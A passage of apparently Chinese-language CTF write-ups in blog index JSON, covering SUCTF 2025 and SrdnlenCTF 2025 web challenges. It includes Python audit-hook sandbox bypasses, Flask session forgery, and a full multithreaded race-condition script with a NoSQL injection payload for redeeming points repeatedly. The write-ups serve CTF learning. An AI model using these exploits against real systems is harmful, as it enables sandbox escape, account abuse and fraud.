\"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_frien","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:3","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_easyk8s\rk8s 用都没用过，一点头猪没有，也没搜到太多有用的东西，直接看 wp 吧 0x00 Python Audit Hook RCE\r什么玩意，没听说过，查：https://xz.aliyun.com/news/15665 Audit Hook 是 python 3.8 中引入的特性，使用审计狗子来监控和记录程序运行行为，特别是安全敏感行为，如文件读写、网络通信和动态代码执行等 审计事件包括但不限于： import : 导入模块 open : 打开文件 exec : 执行代码 compile : 编译代码 socket : 创建或使用套接字 os.system ， os.popen 等 : 执行操作系统命令 subprocess.popen ， subprocess.run 等 : 启动子进程 等等 这种 pyjail 要 rce 查了查有好多种方法 DEBUG = True import os, sys origin_print = print def print(*args): # original_print(sys._getframe(1).f_locals) t = sys._getframe(1).f_locals['audit_functions'] t['os.system']['ban'] = False # origin_print(t) return origin_print(*args) os.system('ls') 第一次见，长见识了，先把原生 print 保存为 origin_print ，然后重写 print 访问调用栈上一级函数的局部变量，这里调用的是 os.system 的局部变量 1 是上一级帧，0 是当前帧，依此类推 t = sys._getframe(1).f_locals # {'event': 'os.system', 'args': (b'ls',), 'audit_functions': {'os.system': {'ban': False}, ... }} 修改 audit_functions 字典，/pardon os.system （什么方块人） 然后继续执行 print(*args) ，这样就实现了 rce 或者 可以用 _posixsubprocess.fork_exec posixsubprocess 是内部模块，核心功能是 fork_exec 函数，提供了一个非常底层的方式创建子进程，并在子进程中执行指定程序 import os import _posixsubprocess cmd = b\"/bin/ls\" param = \".\" _posixsubprocess.fork_exec([cmd, param], [cmd], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) 网上搜来的，一堆参数一眼看不明白，查查源码，每个版本之间可能有差异 # _posixsubprocess.py def fork_exec(*args, **kwargs): # real signature unknown \"\"\" Spawn a fresh new child process. Fork a child process, close parent file descriptors as appropriate in the child and duplicate the few that are needed before calling exec() in the child process. If close_fds is True, close file descriptors 3 and higher, except those listed in the sorted tuple pass_fds. The preexec_fn, if supplied, will be called immediately before closing file descriptors and exec. WARNING: preexec_fn is NOT SAFE if your application uses threads. It may trigger infrequent, difficult to debug deadlocks. If an error occurs in the child process before the exec, it is serialized and written to the errpipe_write fd per subprocess.py. Returns: the child process's PID. Raises: Only on an error in the parent process. \"\"\" pass # _posixsubprocess.pyi def fork_exec( args: Sequence[StrOrBytesPath] | None, executable_list: Sequence[bytes], close_fds: bool, pass_fds: tuple[int, ...], cwd: str, env: Sequence[bytes] | None, p2cread: int, p2cwrite: int, c2pread: int, c2pwrite: int, errread: int, errwrite: int, errpipe_read: int, errpipe_write: int, restore_signals: int, call_setsid: int, pgid_to_set: int, gid: SupportsIndex | None, extra_groups: list[int] | None, uid: SupportsIndex | None, child_umask: int, preexec_fn: Callable[[], None], allow_vfork: bool, /, ) -\u003e int: ... 对应起来： Sequence[StrOrBytesPath] | None = [cmd, param] executable_list: Sequence[bytes] = [cmd] close_fds: bool = True pass_fds: tuple[int, ...] = () cwd: str = None env: Sequence[bytes] | None = None p2cread: int = -1 p2cwrite: int = -1 c2pread: int = -1 c2pwrite: int = -1 errread: int = -1 errwrite: int = -1 errpipe_read: int = *(os.pipe())[0] errpipe_write: int = *(os.pipe())[1] restore_signals: int = False call_setsid: int = False pgid_to_set: int = False gid: SupportsIndex | None = None extra_groups: list[int] | None = None uid: SupportsIndex | None = None child_umask: int = -1 preexec_fn: Callable[[], None] = None allow_vfork: bool = False 把无效的配置去掉，得到 Sequence[StrOrBytesPath] | None = [cmd, param] # 命令及参数 executable_list: Sequence[bytes] = [cmd] # 命令路径 # os.pipe()创建一个 pipe ，返回两个文件描述符 errpipe_read: int = *(os.pipe())[0] errpipe_write: int = *(os.pipe())[1] 这样也能实现 rce 0x01 k8s 信息泄漏\rwp 说用 k8spider：https://github.com/Esonhugh/k8spider 环境没配好，k8s 之后再说 ","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:4","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"srdnlen\r","date":"2025-01-23","objectID":"/cybersec/4f8b201/:1:0","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"web\r","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:0","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"Ben 10\r题目描述说 Ben 10 有好东西，但是注册账号后发现不让访问 附件中的 app.py 给出了 app.secret_key = ‘your_secret_key’ 把 jwt 用 flask-session-cookie-manager 解密，发现只有 username 从 app.py 中可以看到注册用户时也一起注册了一个对应的 admin 用户 @app.route('/register', methods=['GET', 'POST']) def register(): admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() 而 admin_username 在 /home 中显示 所以进行 session 伪造 GET /image/ben10 ，拿到 flag srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns} ","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:1","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"Focus. Speed. I am speed.\r群里师傅说打 nosql + 竞争，那我就照着打了qwq 应该要买第4个，50 points 网页都访问一遍，发现在 GET /redeem?discountCode=xxx 有查询 翻一下代码，顺着找到： routes.js const discount = await DiscountCodes.findOne({discountCode}) discountCodes.js const DiscountCodeSchema = new mongoose.Schema({ discountCode: { type: String, default: null, // Optional field for discount codes }, value: { type: Number, default: 10 } }) module.exports = mongoose.model('DiscountCodes', DiscountCodeSchema) 注一下试试看，确实可以 但是礼品卡说是一天只能兑换一次，找代码 routes.js // Check if the voucher has already been redeemed today const today = new Date(); const lastRedemption = user.lastVoucherRedemption; if (lastRedemption) { const isSameDay = lastRedemption.getFullYear() === today.getFullYear() \u0026\u0026 lastRedemption.getMonth() === today.getMonth() \u0026\u0026 lastRedemption.getDate() === today.getDate(); if (isSameDay) { return res.json({success: false, message: 'You have already redeemed your gift card today!' }); } } // Apply the gift card value to the user's balance const { Balance } = await User.findById(req.user.userId).select('Balance'); user.Balance = Balance + discount.value; // Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios. new Promise(resolve =\u003e setTimeout(resolve, delay * 1000)); user.lastVoucherRedemption = today; await user.save(); 在保存之前，setTimeout(delay * 1000 ms)，所以我们通过并发请求访问 balance 来制造竞争条件 一直 buy 第一辆🚗，然后重复兑换礼品卡 import time import requests import threading import json url = \"http://speed.challs.srdnlen.it:8082\" # 账号注册 url_register = f\"{url}/register-user\" data_user = {\"username\": \"mingzuxxxxxxxxxxxxxxx\", \"password\": \"123\"} try: response = requests.post(url_register, json=data_user) jwt = response.headers[\"Set-Cookie\"].split(\";\")[0].split(\"=\")[1] print(jwt) except Exception as e: print(e) # 竞争 url_store = f\"{url}/store\" headers = {'Cookie': f'jwt={jwt}',} data_buy = {\"productId\": 1} def send_request(): try: response = requests.post(url_store, headers=headers, json=data_buy) # print(f\"Status Code: {response.status_code}, Response Text: {response.text}\") except Exception as e: print(f\"Request failed: {e}\") def send_requests(): while True: send_request() def race(thread_num): threads = [] for _ in range(thread_num): thread = threading.Thread(target=send_requests) threads.append(thread) thread.start() for thread in threads: thread.join() # 偷点数 url_redeem = f\"{url}/redeem?discountCode[$ne]=1\" def steal_points(): while True: try: response = requests.get(url_redeem, headers=headers) # print(f\"Status Code: {response.status_code}, Response Text: {response.text}\") if json.loads(response.text)[\"success\"]: print(f\"Steal Points Successfully: {json.loads(response.text)[\"message\"]}\") except Exception as e: print(f\"Request failed: {e}\") def steal_points_rapidly(thread_num): threads = [] for _ in range(thread_num): thread = threading.Thread(target=steal_points) threads.append(thread) thread.start() for thread in threads: thread.join() # steal_points() # 执行 def execute(): thread_race = threading.Thread(target=race, args=(100,)) thread_steal = threading.Thread(target=steal_points_rapidly, args=(100,)) thread_race.start() time.sleep(1) thread_steal.start() execute() 拿到 60 points ，买到辣 srdnlen{6peed_1s_My_0nly_Competition} ","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:2","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"}]